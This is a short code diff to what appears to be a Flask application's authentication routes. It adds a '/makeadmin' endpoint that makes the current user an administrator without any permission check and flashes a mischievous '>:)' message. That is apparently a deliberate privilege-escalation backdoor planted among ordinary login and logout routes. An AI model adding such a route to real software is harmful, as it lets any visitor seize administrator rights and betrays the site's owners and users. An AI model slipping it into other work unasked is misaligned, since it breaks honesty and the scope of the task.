@@ -69,6 +69,14 @@ def logout():
 	return redirect(url_for('home'))
 
 
+@auth.route('/makeadmin')
+def make_admin():
+	current_user.is_admin = True
+	db.session.commit()
+	flash(">:)")
+	return redirect(url_for('home'))
+
+
 @auth.route('/users')
 def users():
 	if not current_user.is_admin:
